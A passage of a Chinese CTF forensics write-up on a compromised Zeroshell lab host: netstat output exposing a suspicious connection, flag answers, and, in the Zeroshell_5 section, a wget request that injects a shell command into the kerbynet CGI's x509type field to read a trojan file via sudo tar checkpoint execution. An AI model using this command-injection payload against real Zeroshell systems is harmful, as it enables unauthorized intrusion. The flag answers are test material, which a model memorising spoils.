class="hljs-number">.100</span>:<span class="hljs-number">52587</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">41519</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56916</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56916</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43685</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49173</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58851</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56910</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39871</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">54571</span>      c.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34605</span>      l.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43537</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46791</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37013</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46399</span>      a2.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">55289</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39255</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47487</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58451</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39255</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47487</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58451</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49089</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33023</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46925</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">53227</span>      h.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">60573</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56918</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34121</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">46849</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51301</span>      z.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51213</span>      d.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33379</span>      x.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">52391</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37893</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39213</span>      c.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">36225</span>      d.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">52841</span>      l.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56189</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50629</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43567</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">36957</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47391</span>      d.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35085</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">42349</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47627</span>      e.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">34175</span>      A0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">35877</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">40979</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49659</span>      c.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49507</span>      m.dns.it:domain         TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">57829</span>      D0.INFO.AFILIAS-:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37275</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59037</span>      h.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56922</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56535</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56928</span> localhost.localdom:ldap TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56908</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47253</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50011</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47907</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">1</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39386</span>      <span class="hljs-number">202.115</span><span class="hljs-number">.89</span><span class="hljs-number">.103</span>:http-alt SYN_SENT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45417</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">49667</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">45737</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">43643</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37993</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">37993</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">47981</span>      y.ns.se:domain          TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">41227</span>      i.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">33447</span>      ns-w.ant.isi.edu:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58111</span>      c0.org.afilias-n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59913</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">53117</span>      a.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48453</span>      j.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">58467</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50803</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56599</span>      a.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">59077</span>      c.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48575</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdom:ldap localhost.localdo:<span class="hljs-number">56912</span> ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">55893</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">51429</span>      k.root-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39265</span>      i.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">38027</span>      d.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">60927</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">39375</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdo:<span class="hljs-number">56922</span> localhost.localdom:ldap ESTABLISHED<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">56211</span>      <span class="hljs-number">192.112</span><span class="hljs-number">.36</span><span class="hljs-number">.4</span>:domain     TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">50853</span>      dns2.edu.cn:domain      TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">42793</span>      c.gtld-servers.n:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:<span class="hljs-number">48795</span>      b-<span class="hljs-number">2004.</span>b.root-se:domain TIME_WAIT<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:www-http              *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:domain                *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:https                 *:*                     LISTEN<br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::ffff:<span class="hljs-number">61.139</span>.:www-http ::ffff:<span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span>:<span class="hljs-number">64845</span> ESTABLISHED<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:kpasswd               *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomain:domain  *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.254</span>:domain  *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:domain     *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.141</span><span class="hljs-number">.142</span>:domain  *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.locald:domain *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span><span class="hljs-number">.25</span>:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomai:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:kerberos   *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdomain:ntp     *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.100</span>:ntp        *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> localhost.localdoma:ntp *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:ntp                   *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.250</span>:kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> KDC.localdo:kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">61.139</span><span class="hljs-number">.2</span><span class="hljs-number">.10</span>:kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:domain                *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::e40e:6ff:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::20c:29ff:kerberos *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::e40e:6ff:fe6d:ntp *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::20c:29ff:fe9f:ntp *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> ::<span class="hljs-number">1</span>:ntp                 *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> *:ntp                   *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::e40e::kerberos-iv *:*<br>udp        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> fe80::20c:<span class="hljs-number">2</span>:kerberos-iv *:*<br>Active UNIX domain sockets (servers <span class="hljs-keyword">and</span> established)<br>Proto RefCnt Flags       <span class="hljs-type">Type</span>       State         I-Node Path<br>unix  <span class="hljs-number">2</span>      [ ACC ]     STREAM     LISTENING     <span class="hljs-number">15995</span>  /var/run/acpid.socket<br>unix  <span class="hljs-number">2</span>      [ ACC ]     SEQPACKET  LISTENING     <span class="hljs-number">12410</span>  /run/udev/control<br>unix  <span class="hljs-number">9</span>      [ ]         DGRAM                    <span class="hljs-number">16811</span>  /dev/log<br>unix  <span class="hljs-number">3</span>      [ ]         STREAM     CONNECTED     <span class="hljs-number">20014</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19977</span><br>unix  <span class="hljs-number">3</span>      [ ]         STREAM     CONNECTED     <span class="hljs-number">20015</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19636</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">16830</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19316</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">19606</span><br>unix  <span class="hljs-number">3</span>      [ ]         DGRAM                    <span class="hljs-number">7849</span><br>unix  <span class="hljs-number">3</span>      [ ]         DGRAM                    <span class="hljs-number">7850</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">18318</span><br>unix  <span class="hljs-number">2</span>      [ ]         DGRAM                    <span class="hljs-number">15992</span><br>flag&#123;<span class="hljs-number">202.115</span><span class="hljs-number">.89</span><span class="hljs-number">.103</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Zeroshell-4"><a href="#Zeroshell-4" class="headerlink" title="Zeroshell_4"></a>Zeroshell_4</h3><ul>
+<li>全局搜索目标ip<code>202.115.89.103</code></li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826826.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
+<li>Exp find全局搜一下</li>
+<li>在&#x2F;Database&#x2F;目录下，和 flag一样</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;.nginx&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="Zeroshell-5"><a href="#Zeroshell-5" class="headerlink" title="Zeroshell_5"></a>Zeroshell_5</h3><p>提取木马文件</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">wget &quot;http://61.139.2.100/cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27cat%20/Database/.nginx%27%0A%27&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826074.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>得到的文件拖到IDA中打开，查看字符串，发现IP后面跟着一串字符，猜测为加密秘钥，尝试提交，结果正确</p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826028.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;11223344qweasdzxc&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="WinFT-1"><a href="#WinFT-1" class="headerlink" title="WinFT_1"></a>WinFT_1</h3><ul>
+<li>老规矩，先net一下看看</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">netstat -a<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>明显有一个外部地址不一样</li>
+</ul>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826972.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<ul>
